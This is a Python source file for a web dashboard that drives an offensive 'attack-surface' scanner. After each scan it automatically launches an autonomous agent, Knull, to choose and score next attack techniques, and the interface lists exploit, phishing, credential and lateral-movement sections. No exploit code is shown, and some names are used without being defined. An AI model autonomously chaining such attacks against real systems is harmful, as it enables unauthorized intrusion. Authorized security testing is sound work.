"""dashboard.py — live web dashboard for attack-surface (stdlib-only).

Endpoints:
  /                → RTL Persian dashboard (risk chart, findings, hosts, subs)
  /api/state       → JSON: all scans from DB + latest scan detail
  /api/scan        → POST {"domain":..., "max_subs":...} → start background scan
  /api/progress    → SSE stream of live scan progress (phase-by-phase)
  /api/diff        → GET ?a=ID&b=ID → compare two scans

Zero heavy deps: http.server + json + SSE. Runs: attack-surface serve
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

_DB = None          # set by serve()
_agent_instance = None   # global autonomous agent
_agent_thread = None     # agent execution thread
_STATE = {          # live scan state (protected by LOCK)
    "running": False,
    "domain": None,
    "phase": "-",
    "progress": 0,
    "lines": [],
    "started": None,
    "finished": None,
    "exit": None,
    "knull_cfg": {},   # operator settings, survive across Knull launches
}
_LOCK = threading.Lock()
_SSE_CLIENTS: list = []   # simple queue-based SSE subscribers
PHASES = ["Discovery", "Alive", "Ports", "Headers", "Tech", "Panels",
          "Risk", "Blue-team", "Export"]


def _sse_publish(msg: dict) -> None:
    msg["ts"] = time.time()
    for q in list(_SSE_CLIENTS):
        try:
            q.put_nowait(msg)
        except Exception:
            pass


# ------------------------------------------------------------ scan worker

def _run_scan(domain: str, max_subs: int, timeout_s: int = 1800) -> None:
    """Background scan worker; updates _STATE + publishes SSE."""
    import logging
    logging.disable(logging.INFO)
    with _LOCK:
        _STATE.update(running=True, domain=domain, phase="Discovery",
                      progress=0, lines=[], started=time.time(),
                      finished=None, exit=None)
    _sse_publish({"event": "start", "domain": domain})

    root = os.path.dirname(os.path.abspath(__file__))
    root = os.path.dirname(root)  # modules/.. = project root
    cmd = [os.path.join(root, ".venv/bin/python") if os.path.exists(
               os.path.join(root, ".venv/bin/python")) else "python3",
           os.path.join(root, "attack_surface.py"),
           "-d", domain, "--max-subdomains", str(max_subs),
           # detection coverage: without --cves the NVD mapping never runs
           # (sections['cves'] was empty in every scan ever taken), and
           # --poc adds safe active probes (TLS audit, DNS AXFR/DNSSEC).
           # --cves-deep adds exact CPE matching when versions are known.
           # --asm keeps an asset inventory and reports what changed
           # since the previous snapshot.
           "--cves", "--cves-deep", "--poc", "--asm",
           "--hunt-plan", "--pdf", "--redteam", "--msf-map", "--httpx", "--nuclei"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, text=True, bufsize=1)
    # hard cap so a hung host can never wedge the dashboard
    _kill_timer = threading.Timer(timeout_s, proc.kill)
    _kill_timer.daemon = True
    _kill_timer.start()
    phase_re = re.compile(r"\[Phase ([\d.]+)\] ([^:]+)")
    n_phases = len(PHASES)
    for line in proc.stdout:
        with _LOCK:
            _STATE["lines"].append(line.rstrip())
            _STATE["lines"] = _STATE["lines"][-200:]
        m = phase_re.search(line)
        if m:
            ph = m.group(2).strip().rstrip(":")
            num = float(m.group(1))
            with _LOCK:
                _STATE["phase"] = ph
                _STATE["progress"] = min(int(num / 6 * 100), 95)
        _sse_publish({"event": "log", "line": line.rstrip()[:200]})
    rc = proc.wait()
    _kill_timer.cancel()
    with _LOCK:
        _STATE.update(running=False, finished=time.time(), exit=rc,
                      progress=100,
                      phase="Done" if rc == 0 else f"Exit {rc}")
    # Persist last scan output so the terminal survives page reloads/restarts
    try:
        out_dir = os.path.join(root, "reports")  # root is already the project root
        os.makedirs(out_dir, exist_ok=True)
        with open(os.path.join(out_dir, "last_scan.log"), "w") as fh:
            with _LOCK:
                fh.write("\n".join(_STATE["lines"][-200:]))
    except Exception:
        pass
    _sse_publish({"event": "done", "exit": rc})
    _finish_impact(rc, domain)
    # Hand off to the autonomous agent: it re-reads this scan from the DB,
    # runs the advisor, and picks the highest-value next technique.
    if rc == 0 and _STATE.get("auto_agent", True):
        try:
            _launch_agent(domain)
        except Exception as e:
            _sse_publish({"event": "agent_error", "error": str(e)})


def _finish_impact(rc: int, domain: str) -> None:
    """Close the impact-proof loop: diff this re-scan against the baseline.

    Started by /api/impact/start before the operator fires. The diff is
    published over SSE and fed into Knull's memory, so a shot that changed
    nothing counts against that technique in the scoreboard.
    """
    with _LOCK:
        imp = _STATE.get("impact")
    if not imp or imp.get("phase") != "running":
        return

    imp["phase"] = "done" if rc == 0 else "error"
    imp["finished"] = time.time()
    imp["exit"] = rc
    try:
        import db_store
        if rc != 0:
            imp["error"] = f"re-scan exited {rc}"
            _sse_publish({"event": "impact", "payload": imp})
            return

        scans = db_store.list_scans(_DB)
        newest = int(scans[0]["id"]) if scans else 0
        baseline = int(imp.get("baseline") or 0)
        if not baseline or not newest or baseline == newest:
            imp["phase"] = "error"
            imp["error"] = "no new scan row produced to compare"
            _sse_publish({"event": "impact", "payload": imp})
            return

        diff = db_store.compare(baseline, newest, _DB)
        imp["after_scan"] = newest
        imp["diff"] = diff

        if _agent_instance:
            res = _agent_instance.record_impact(
                str(imp.get("technique") or "?"),
                str(imp.get("target") or ""), diff)
            imp["changed"] = bool(res.get("changed"))
            imp["summary"] = res.get("summary", "")
        else:
            new_f = diff.get("new_findings") or []
            new_s = diff.get("new_subdomains") or []
            delta = diff.get("score_delta") or 0
            changed = bool(new_f) or bool(new_s) or bool(delta)
            imp["changed"] = changed
            imp["summary"] = (f"findings {len(new_f)} new, "
                              f"subdomains {len(new_s)} new, "
                              f"risk Δ{delta:+g}")
            db_store.knull_remember(
                technique=str(imp.get("technique") or "?"),
                outcome=("impact" if changed else "failure"),
                domain=domain, target=str(imp.get("target") or ""),
                detail=("[impact] " + imp["summary"] if changed
                        else "[impact] no measurable change ("
                             + imp["summary"] + ")"),
                db_path=_DB)
    except Exception as e:  # never break the scan completion path
        imp["phase"] = "error"
        imp["error"] = str(e)[:300]
    _sse_publish({"event": "impact", "payload": imp})


def _apply_knull_cfg(agent):
    """Re-apply the operator's saved settings to a fresh Knull instance."""
    cfg = _STATE.get("knull_cfg") or {}
    if cfg:
        try:
            agent.configure(cfg)
        except Exception as e:
            logger.warning("knull config reapply failed: %s", e)
    return agent


def _launch_agent(domain: str, auto_execute: bool = False,
                  max_iterations: int = 10) -> None:
    """Start Knull (the autonomous agent) against the just-finished scan."""
    global _agent_instance, _agent_thread
    from modules.knull import Knull
    _agent_instance = _apply_knull_cfg(Knull(
        scan_id=0,
        target_domain=domain,
        max_iterations=max_iterations,
        auto_execute=auto_execute,
        event_callback=_agent_event,
        db_path=_DB,
    ))
    _agent_thread = threading.Thread(target=_agent_instance.start, daemon=True)
    _agent_thread.start()
    _sse_publish({"event": "agent_start",
                  "agent_id": _agent_instance.agent_id, "domain": domain})


def _agent_event(ev: Dict) -> None:
    """Forward agent events into the dashboard SSE stream."""
    _sse_publish({"event": "agent", "payload": ev})


def _start_scan(domain: str, max_subs: int,
                timeout_s: int = 1800) -> bool:
    with _LOCK:
        if _STATE["running"]:
            return False
    t = threading.Thread(target=_run_scan,
                         args=(domain, max_subs, timeout_s), daemon=True)
    t.start()
    return True


# ------------------------------------------------------------ HTML

_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>Attack Surface — Operations Console</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
:root{--bg:#000;--panel:#0a0505;--panel2:#120707;--bd:#3a0d0d;--bd2:#5c1414;--tx:#e8e0d8;
--mut:#8a7f78;--ac:#e62e00;--ac2:#ff5a1f;--ac3:#ff8c42;--ok:#00ff66;--warn:#ffb000;
--hi:#ff5a1f;--crit:#ff2200;--info:#8a7f78}
*{box-sizing:border-box;margin:0}
html,body{height:100%}
body{background:var(--bg);
background-image:radial-gradient(ellipse at 50% -10%,rgba(230,46,0,.07),transparent 55%),
radial-gradient(ellipse at 100% 100%,rgba(230,46,0,.05),transparent 45%);
color:var(--tx);font-family:'JetBrains Mono','Cascadia Code','Fira Code',ui-monospace,Consolas,monospace;font-size:13.5px}
body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:9998;
background:repeating-linear-gradient(0deg,rgba(0,0,0,.16) 0 1px,transparent 1px 3px);mix-blend-mode:multiply;opacity:.5}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.5) 100%)}
header{display:flex;align-items:center;gap:14px;padding:10px 20px;
background:linear-gradient(180deg,#140505 0%,#000 100%);border-bottom:1px solid var(--bd2);
box-shadow:0 2px 24px rgba(230,46,0,.15),inset 0 -1px 0 rgba(230,46,0,.25);position:sticky;top:0;z-index:5}
header .dragon{width:46px;height:46px;flex:none;filter:drop-shadow(0 0 6px rgba(255,90,31,.7))}
header .logo{font-weight:800;font-size:16px;letter-spacing:2px;text-transform:uppercase;
background:linear-gradient(90deg,#fff 0%,var(--ac3) 55%,var(--ac) 100%);
-webkit-background-clip:text;background-clip:text;color:transparent}
header .logo small{display:block;font-size:9.5px;letter-spacing:4px;color:var(--mut);
-webkit-text-fill-color:var(--mut);font-weight:400;margin-top:2px}
header .tag{font-size:10px;color:var(--ac3);border:1px solid var(--bd2);border-radius:2px;
padding:2px 10px;letter-spacing:2px;background:rgba(230,46,0,.06)}
header .right{margin-inline-start:auto;display:flex;gap:12px;align-items:center;font-size:11.5px;color:var(--mut)}
.dot{width:8px;height:8px;border-radius:99px;background:var(--ok);display:inline-block;
box-shadow:0 0 8px var(--ok);animation:pulse 2s infinite}
.dot.off{background:var(--crit);box-shadow:0 0 8px var(--crit);animation:none}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
main{padding:18px 20px;max-width:1500px;margin:0 auto}
.toolbar{display:flex;gap:10px;align-items:center;background:var(--panel);border:1px solid var(--bd);
border-radius:4px;padding:12px 14px;margin-bottom:16px;flex-wrap:wrap;box-shadow:inset 0 0 30px rgba(230,46,0,.03)}
.toolbar input[type=text],.toolbar input[type=number]{background:#000;border:1px solid var(--bd2);
color:var(--ok);border-radius:2px;padding:8px 12px;font-family:inherit;font-size:13px;
box-shadow:inset 0 0 8px rgba(0,0,0,.8)}
.toolbar input:focus{outline:none;border-color:var(--ac);box-shadow:0 0 10px rgba(230,46,0,.35)}
.toolbar input[type=text]{width:300px}
.toolbar input[type=number]{width:80px}
.btn{background:linear-gradient(180deg,#2a0a05,#160503);border:1px solid var(--ac);
color:var(--ac3);font-weight:700;border-radius:2px;padding:8px 18px;cursor:pointer;
font-family:inherit;letter-spacing:1px;text-transform:uppercase;font-size:12px;
text-shadow:0 0 8px rgba(255,90,31,.5);
box-shadow:0 0 12px rgba(230,46,0,.15),inset 0 1px 0 rgba(255,255,255,.05);transition:all .15s}
.btn:hover{background:linear-gradient(180deg,#4a1005,#2a0a05);box-shadow:0 0 20px rgba(230,46,0,.4);color:#fff}
.btn:disabled{opacity:.4;cursor:wait}
.btn.ghost{background:transparent;border:1px solid var(--bd2);color:var(--mut);box-shadow:none;text-shadow:none}
.btn.ghost:hover{border-color:var(--ac);color:var(--ac3);background:rgba(230,46,0,.06)}
.btn.danger{border-color:var(--crit);color:#ff8a7a}
.kpis{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-bottom:16px}
.kpi{background:var(--panel);border:1px solid var(--bd);border-radius:4px;padding:14px 16px;position:relative;overflow:hidden}
.kpi:before{content:'';position:absolute;inset-inline-start:0;top:0;bottom:0;width:3px;background:var(--ac);box-shadow:0 0 10px var(--ac)}
.kpi.k-crit:before{background:var(--crit);box-shadow:0 0 10px var(--crit)}
.kpi.k-hi:before{background:var(--hi);box-shadow:0 0 10px var(--hi)}
.kpi.k-warn:before{background:var(--warn)}
.kpi.k-ok:before{background:var(--ok)}
.kpi .lbl{font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:var(--mut);margin-bottom:6px}
.kpi .num{font-size:26px;font-weight:800;line-height:1;color:var(--tx);text-shadow:0 0 12px rgba(232,224,216,.25)}
.kpi .sub{font-size:10.5px;color:var(--mut);margin-top:5px;letter-spacing:.5px}
.sev-badge{display:inline-block;padding:2px 10px;border-radius:2px;font-size:9.5px;font-weight:700;
text-transform:uppercase;letter-spacing:1px;border:1px solid}
.sv-critical{background:rgba(255,34,0,.12);color:#ff5a45;border-color:rgba(255,34,0,.45);box-shadow:0 0 10px rgba(255,34,0,.25)}
.sv-high{background:rgba(255,90,31,.12);color:var(--ac3);border-color:rgba(255,90,31,.4)}
.sv-medium{background:rgba(255,176,0,.1);color:var(--warn);border-color:rgba(255,176,0,.35)}
.sv-low{background:rgba(0,255,102,.08);color:var(--ok);border-color:rgba(0,255,102,.3)}
.sv-info{background:rgba(138,127,120,.1);color:var(--info);border-color:rgba(138,127,120,.3)}
.scan-panel{background:var(--panel);border:1px solid var(--bd);border-radius:4px;margin-bottom:16px;
overflow:hidden;box-shadow:0 0 30px rgba(230,46,0,.05)}
.scan-head{display:flex;align-items:center;gap:14px;padding:10px 16px;border-bottom:1px solid var(--bd);
background:linear-gradient(180deg,#160707,#0a0404)}
.scan-head .ph{font-weight:700;color:var(--ac3);min-width:180px;text-shadow:0 0 10px rgba(255,90,31,.5)}
.scan-head .pct{margin-inline-start:auto;font-weight:700;font-size:13px;color:var(--ok)}
.pbar{height:6px;background:#000;border-top:1px solid var(--bd)}
.pbar i{display:block;height:100%;background:linear-gradient(90deg,#5c1414,var(--ac),var(--ac3));
width:0%;transition:width .4s;box-shadow:0 0 12px rgba(230,46,0,.7)}
.scanlog{max-height:230px;overflow-y:auto;overflow-x:hidden;padding:12px 16px;font-family:inherit;font-size:11.5px;
line-height:1.7;color:var(--ok);direction:ltr;text-align:left;white-space:pre-wrap;
background:linear-gradient(180deg,rgba(0,255,102,.02),transparent 40%),#000;
text-shadow:0 0 6px rgba(0,255,102,.35)}
.scanlog .ok{color:var(--ok)}.scanlog .warn{color:var(--warn)}.scanlog .err{color:var(--crit)}
.scanlog::-webkit-scrollbar{width:8px}
.scanlog::-webkit-scrollbar-track{background:#0a0404}
.scanlog::-webkit-scrollbar-thumb{background:var(--bd2);border-radius:1px}
.scanlog::-webkit-scrollbar-thumb:hover{background:var(--ac)}
.banner{color:var(--ac3);text-shadow:0 0 10px rgba(255,90,31,.6);line-height:1.3}
.cols{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@media(max-width:950px){.cols{grid-template-columns:1fr}}
.panel{background:var(--panel);border:1px solid var(--bd);border-radius:4px;overflow:hidden}
.panel h3{font-size:11px;text-transform:uppercase;letter-spacing:1.5px;color:var(--ac3);
padding:11px 16px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:8px;
background:linear-gradient(180deg,#140606,#0a0404)}
.panel h3 .cnt{background:#000;border:1px solid var(--bd2);border-radius:2px;padding:1px 9px;font-size:10.5px;color:var(--mut)}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th{font-size:9.5px;text-transform:uppercase;letter-spacing:1.2px;color:var(--ac3);text-align:left;
padding:9px 14px;border-bottom:1px solid var(--bd2);font-weight:700;background:#0c0404}
td{padding:9px 14px;border-bottom:1px solid #1a0a0a;vertical-align:top}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(230,46,0,.06)}
.mono{font-family:inherit;font-size:11.5px;direction:ltr}
.kev-yes{color:var(--crit);font-weight:700;text-shadow:0 0 8px rgba(255,34,0,.5)}
.btn.atk{background:linear-gradient(180deg,#2a0505,#140202);color:#ff6a55;font-weight:700;
padding:3px 10px;font-size:10.5px;border:1px solid rgba(255,34,0,.5);
text-shadow:0 0 8px rgba(255,34,0,.6);box-shadow:0 0 8px rgba(255,34,0,.15)}
.btn.atk:hover{background:var(--crit);color:#fff;box-shadow:0 0 18px rgba(255,34,0,.6)}
.port-chip{display:inline-block;background:#0f0606;border:1px solid var(--bd);border-radius:2px;
padding:2px 8px;margin:2px 3px;font-family:inherit;font-size:11px;color:#d8cfc8}
.port-chip b{color:var(--ac3);margin-inline-end:4px;text-shadow:0 0 6px rgba(255,90,31,.5)}
.muted{color:var(--mut);font-size:11.5px}
.hostcell b{display:block}.hostcell .ip{color:var(--mut);font-size:10.5px}
ul.subs{list-style:none;padding:6px 0;columns:3;column-gap:6px;font-size:11.5px}
ul.subs li{padding:3px 14px;color:#c9bdb4;font-family:inherit;font-size:11px;break-inside:avoid}
ul.subs li::before{content:'» ';color:var(--ac)}
.cved{color:var(--crit);font-weight:600}
.empty{padding:26px;text-align:center;color:var(--mut);font-size:12.5px;letter-spacing:.5px}
#chart{width:100%;height:170px}
.legend{display:flex;gap:14px;padding:8px 16px;font-size:10.5px;color:var(--mut);
border-top:1px solid var(--bd);letter-spacing:.5px}
.legend i{width:10px;height:10px;border-radius:2px;display:inline-block;margin-inline-end:5px;vertical-align:-1px}
/* ── Grouped sidebar navigation (Nessus/GVM style) ───────────────── */
h1,h2,h3,h4,th,td,button,input,select,textarea,.lbl,.num,.sub,.tag,.logo{font-family:inherit}
body{padding-inline-start:224px}
#sidebar{position:fixed;inset-block:66px 0;inset-inline-start:0;width:224px;
overflow-y:auto;overflow-x:hidden;z-index:4;
background:linear-gradient(180deg,#0c0403 0%,#070202 100%);
border-inline-end:1px solid var(--bd);padding:6px 0 40px;
scrollbar-width:thin;scrollbar-color:#3a1108 transparent}
#sidebar::-webkit-scrollbar{width:8px}
#sidebar::-webkit-scrollbar-track{background:transparent}
#sidebar::-webkit-scrollbar-thumb{background:#3a1108;border-radius:8px}
#sidebar::-webkit-scrollbar-thumb:hover{background:#5c1a0e}
.nav-brand{font-size:9.5px;letter-spacing:3px;text-transform:uppercase;color:#6b5b52;
padding:10px 14px 4px;display:flex;align-items:center;gap:7px}
.nav-brand i{width:5px;height:5px;border-radius:99px;background:var(--ac);
box-shadow:0 0 7px var(--ac);flex:none}
.nav-group{margin:0;padding:2px 8px 6px}
.nav-head{display:flex;align-items:center;gap:6px;width:100%;background:transparent;border:0;
color:#8d7a6f;font-family:inherit;font-size:10px;font-weight:700;letter-spacing:1.6px;
text-transform:uppercase;padding:9px 6px 6px;cursor:pointer;user-select:none;text-align:start}
.nav-head:hover{color:var(--ac3)}
.nav-head .caret{font-size:8px;transition:transform .18s ease;opacity:.7;flex:none}
.nav-head.closed .caret{transform:rotate(-90deg)}
.nav-head .rule{flex:1;height:1px;background:linear-gradient(90deg,var(--bd2),transparent);margin-inline-start:2px}
.nav-items{display:flex;flex-direction:column;gap:1px}
.nav-btn{display:flex;align-items:center;gap:10px;width:100%;background:transparent;border:0;
color:var(--mut);font-family:inherit;font-size:12.5px;padding:9px 10px 9px 12px;
cursor:pointer;text-align:start;border-inline-start:2px solid transparent;
border-radius:0 3px 3px 0;transition:background .12s,color .12s}
.nav-btn:hover{color:var(--tx);background:rgba(230,46,0,.06)}
.nav-btn.on{color:var(--ac3);border-inline-start-color:var(--ac);
background:rgba(230,46,0,.09)}
.nav-btn .ico{width:16px;text-align:center;flex:none;opacity:.85;font-size:12px}
.nav-btn.on .ico{opacity:1}
.nav-foot{margin:14px 14px 0;padding:9px 10px;border:1px solid var(--bd);border-radius:4px;
background:#0a0303;font-size:10.5px;color:var(--mut);line-height:1.7}
.nav-foot b{color:var(--ac3);font-weight:600}
/* keep stacked action buttons in a table cell from touching each other */
td .btn{margin:3px 6px 3px 0}
@media (max-width:900px){
 body{padding-inline-start:0}
 #sidebar{position:static;width:auto;inset:auto;border-inline-end:0;
  border-bottom:1px solid var(--bd);max-height:none}
 .nav-items{flex-direction:row;flex-wrap:wrap}
}
progress{width:100%;height:4px}
/* ── Omega dynamic skin ─────────────────────────────── */
main{animation:fadeinI .7s cubic-bezier(.2,.7,.2,1) both}
@keyframes fadeinI{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
table tbody tr{animation:rowInI .35s ease both}
@keyframes rowInI{from{opacity:0;transform:translateX(-8px)}to{opacity:1;transform:translateX(0)}}
button,.btn,header .tag{transition:transform .15s ease,box-shadow .15s ease}
button:hover{transform:translateY(-1px)}
#engine-dot,#livephase{animation:glowI 1.8s ease-in-out infinite alternate}
@keyframes glowI{from{text-shadow:0 0 0 var(--ac);opacity:.9}to{text-shadow:0 0 10px var(--ac);opacity:1}}
.card,.panel{transition:box-shadow .2s ease}
.card:hover{box-shadow:0 8px 24px rgba(230,46,0,.15)}
/* end Omega */
</style></head><body>
<header>
 <svg class="dragon" viewBox="0 0 64 64" aria-hidden="true">
  <defs>
   <linearGradient id="drg" x1="0" y1="0" x2="1" y2="1">
    <stop offset="0" stop-color="#ff8c42"/><stop offset=".55" stop-color="#e62e00"/><stop offset="1" stop-color="#8a1000"/>
   </linearGradient>
  </defs>
  <!-- BackTrack homage: eastern dragon curled around a terminal prompt -->
  <path d="M32 4c-2.2 0-4 1.8-4 4 0 1.3.6 2.4 1.6 3.1C22 13 16 18.6 14 26c-1.3 4.8-.4 9.9 2.4 13.9l-6.2 3.2c-1 .5-1.4 1.7-.9 2.7.5 1 1.7 1.4 2.7.9l7.4-3.8c3.6 2.9 8.4 4.2 13 3.4 6.8-1.1 12.2-6.5 13.3-13.3.5-3.2-.1-6.4-1.7-9.2 2.9-1.6 5-4.4 5.7-7.8.2-1.1 1.2-1.9 2.3-1.7 1.1.2 1.9 1.2 1.7 2.3-.9 4.4-3.4 8.2-7.1 10.6.7 1.4 1.1 3 1.1 4.6 0 8.8-7.2 16-16 16-3.8 0-7.3-1.3-10-3.5l-5.1 2.6c-2.9 1.5-6.4.3-7.9-2.6-1.5-2.9-.3-6.4 2.6-7.9l2.6-1.3C12.6 36.2 12 33.4 12 30.5c0-8.4 5.8-15.5 13.6-17.6-.4-.8-.6-1.7-.6-2.6 0-2.9 2.4-5.4 5.4-5.4 1.4 0 2.7.5 3.6 1.4C35.9 4.5 34 4 32 4z" fill="url(#drg)"/>
  <path d="M40 22l6-8 1.5 6.5L54 18l-1 7.5 6-2-4.5 5.5" fill="none" stroke="#ffb000" stroke-width="1.6" stroke-linejoin="round" opacity=".9"/>
  <circle cx="30" cy="26" r="2.4" fill="#0d0d0d"/><circle cx="30.8" cy="25.2" r=".9" fill="#ffd000"/>
  <path d="M8 52h48" stroke="#e62e00" stroke-width="1.4" opacity=".35"/>
  <text x="32" y="60" text-anchor="middle" font-size="7" font-family="monospace" fill="#ff8c42" opacity=".9">root@bt</text>
 </svg>
 <div class="logo">Back<span style="-webkit-text-fill-color:var(--ac3)">Track</span><small>ATTACK SURFACE CONSOLE</small></div>
 <div class="tag">RECON · RED TEAM · BLUE TEAM</div>
 <div class="right"><span class="dot" id="engine-dot"></span><span id="engine-st">idle</span><span class="tag" id="ac-badge" style="cursor:pointer" onclick="tab('j',document.getElementById('jbtn'))">⚔ 0 jobs</span></div>
</header>
<aside id="sidebar">
 <div class="nav-brand"><i></i>Console</div>

 <div class="nav-group">
  <button class="nav-head" data-g="surface"><span class="caret">▼</span>Surface<span class="rule"></span></button>
  <div class="nav-items">
   <button class="nav-btn on" data-t="f" onclick="tab('f',this)"><span class="ico">◉</span>Findings</button>
   <button class="nav-btn" data-t="h" onclick="tab('h',this)"><span class="ico">▤</span>Hosts</button>
   <button class="nav-btn" data-t="s" onclick="tab('s',this)"><span class="ico">⎋</span>Subdomains</button>
   <button class="nav-btn" data-t="a" onclick="tab('a',this)"><span class="ico">⌂</span>Admin Panels</button>
   <button class="nav-btn" data-t="w" onclick="tab('w',this)"><span class="ico">✦</span>WordPress</button>
   <button class="nav-btn" data-t="q" onclick="tab('q',this)"><span class="ico">⌗</span>SQLi Surface</button>
   <button class="nav-btn" data-t="c" onclick="tab('c',this)"><span class="ico">✷</span>CVE Watchlist</button>
   <button class="nav-btn" data-t="e" onclick="tab('e',this)"><span class="ico">✉</span>Email Security</button>
  </div>
 </div>

 <div class="nav-group">
  <button class="nav-head" data-g="attack"><span class="caret">▼</span>Attack<span class="rule"></span></button>
  <div class="nav-items">
   <button class="nav-btn" data-t="agent" id="agentbtn" onclick="tab('agent',this)"><span class="ico">🧠</span>Knull</button>
   <button class="nav-btn" data-t="chat" id="chatbtn" onclick="tab('chat',this)"><span class="ico">💬</span>Chat Knull</button>
   <button class="nav-btn" data-t="j" id="jbtn" onclick="tab('j',this)"><span class="ico">⚔</span>Actions</button>
   <button class="nav-btn" data-t="arsenal" id="arsenalbtn" onclick="tab('arsenal',this)"><span class="ico">🗡</span>Arsenal</button>
   <button class="nav-btn" data-t="rt" id="rtbtn" onclick="tab('rt',this)"><span class="ico">🩸</span>Auto Red Team</button>
   <button class="nav-btn" data-t="r2" onclick="tab('r2',this)"><span class="ico">◎</span>Red Team</button>
   <button class="nav-btn" data-t="msf" onclick="tab('msf',this)"><span class="ico">⬢</span>MSF Exploits</button>
   <button class="nav-btn" data-t="phish" id="phishbtn" onclick="tab('phish',this)"><span class="ico">🪤</span>Phishing &amp; OSINT</button>
   <button class="nav-btn" data-t="term" onclick="tab('term',this)"><span class="ico">▮</span>Terminal</button>
  </div>
 </div>

 <div class="nav-group">
  <button class="nav-head" data-g="analysis"><span class="caret">▼</span>Analysis<span class="rule"></span></button>
  <div class="nav-items">
   <button class="nav-btn" data-t="graph" id="graphbtn" onclick="tab('graph',this)"><span class="ico">🕸</span>Attack Graph</button>
   <button class="nav-btn" data-t="chain" onclick="tab('chain',this)"><span class="ico">⛓</span>Attack Chains</button>
   <button class="nav-btn" data-t="kc" onclick="tab('kc',this)"><span class="ico">🩸</span>Kill Chain</button>
   <button class="nav-btn" data-t="creds" onclick="tab('creds',this)"><span class="ico">🔑</span>Cred Engine</button>
   <button class="nav-btn" data-t="origin" onclick="tab('origin',this)"><span class="ico">🎯</span>Origin Hunter</button>
   <button class="nav-btn" data-t="lat" onclick="tab('lat',this)"><span class="ico">🔗</span>Lateral Movement</button>
   <button class="nav-btn" data-t="m" onclick="tab('m',this)"><span class="ico">▦</span>MITRE ATT&amp;CK</button>
   <button class="nav-btn" data-t="mitre" onclick="tab('mitre',this)"><span class="ico">▩</span>MITRE Matrix</button>
   <button class="nav-btn" data-t="topo" onclick="tab('topo',this)"><span class="ico">⋔</span>Topology</button>
  </div>
 </div>

 <div class="nav-group">
  <button class="nav-head" data-g="assets"><span class="caret">▼</span>Assets<span class="rule"></span></button>
  <div class="nav-items">
   <button class="nav-btn" data-t="d" onclick="tab('d',this)"><span class="ico">☁</span>Cloud</button>
   <button class="nav-btn" data-t="p" onclick="tab('p',this)"><span class="ico">◈</span>API Security</button>
   <button class="nav-btn" data-t="b" onclick="tab('b',this)"><span class="ico">⧉</span>SBOM</button>
   <button class="nav-btn" data-t="asm" onclick="tab('asm',this)"><span class="ico">🛰</span>Monitoring</button>
  </div>
 </div>

 <div class="nav-group">
  <button class="nav-head" data-g="output"><span class="caret">▼</span>Output<span class="rule"></span></button>
  <div class="nav-items">
   <button class="nav-btn" data-t="r" onclick="tab('r',this)"><span class="ico">⎙</span>Reports</button>
   <button class="nav-btn" data-t="i" onclick="tab('i',this)"><span class="ico">⇄</span>Integrations</button>
  </div>
 </div>

 <div class="nav-foot"><b>bt</b> attack-surface console<br>scope is enforced on every shot</div>
</aside>
<main>

<div class="toolbar">
 <input type="text" id="dom" placeholder="target domain (e.g. example.com)" value="">
 <input type="number" id="ms" value="30" min="5" max="200" title="max subdomains">
 <button class="btn" id="btn" onclick="startScan()">▶ Run Scan</button>
 <button class="btn ghost" onclick="refresh()">⟳ Refresh</button>
 <span class="muted" id="livephase" style="margin-inline-start:auto"></span>
</div>

<div class="kpis">
 <div class="kpi k-crit"><div class="lbl">Risk Score</div><div class="num" id="k-score">—</div><div class="sub" id="k-level">no scan yet</div></div>
 <div class="kpi k-crit"><div class="lbl">Critical</div><div class="num" id="k-crit">0</div><div class="sub">findings</div></div>
 <div class="kpi k-hi"><div class="lbl">High</div><div class="num" id="k-high">0</div><div class="sub">findings</div></div>
 <div class="kpi k-warn"><div class="lbl">Medium</div><div class="num" id="k-med">0</div><div class="sub">findings</div></div>
 <div class="kpi k-ok"><div class="lbl">Low / Info</div><div class="num" id="k-low">0</div><div class="sub">findings</div></div>
 <div class="kpi"><div class="lbl">Live Hosts</div><div class="num" id="k-hosts">—</div><div class="sub">responding</div></div>
 <div class="kpi"><div class="lbl">Subdomains</div><div class="num" id="k-subs">—</div><div class="sub">discovered</div></div>
</div>

<div class="scan-panel">
 <div class="scan-head">
  <span class="ph" id="phase">—</span>
  <span class="pct" id="pct"></span>
 </div>
 <div class="pbar"><i id="pbar"></i></div>
 <div class="scanlog" id="log">[boot] BackTrack Attack Surface Console v0.21.0
[boot] tribute build — the dragon never sleeps
[*] scan output streams here. Press ▶ Run Scan to begin.</div>
</div>

<div class="cols">
 <div class="panel">
  <h3>Risk Trend <span class="cnt" id="nscans">0 scans</span></h3>
  <canvas id="chart" width="600" height="170"></canvas>
  <div class="legend"><span><i style="background:#e62e00"></i>overall score per scan</span><span style="margin-inline-start:auto">bt · recon console</span></div>
 </div>
 <div class="panel">
  <div id="tab-f">
   <table><thead><tr><th style="width:26%">Host</th><th>Finding</th><th style="width:70px">Sev</th><th style="width:100px">Attack</th></tr></thead>
   <tbody id="tb"></tbody></table>
   <div class="empty" id="f-empty" style="display:none">No findings in the latest scan.</div>
  </div>
  <div id="tab-h" style="display:none">
   <table><thead><tr><th>Host</th><th>IP</th><th>Open Ports (service — version)</th></tr></thead>
   <tbody id="tb-h"></tbody></table>
  </div>
  <div id="tab-s" style="display:none"><ul class="subs" id="subs"></ul></div>
  <div id="tab-a" style="display:none"><table><thead><tr><th>Host</th><th>Panel</th><th>URL</th></tr></thead><tbody id="tb-a"></tbody></table></div>
  <div id="tab-w" style="display:none"><table><thead><tr><th>Site</th><th>Version</th><th>Theme</th><th>Plugins</th><th>Issues</th></tr></thead><tbody id="tb-w"></tbody></table></div>
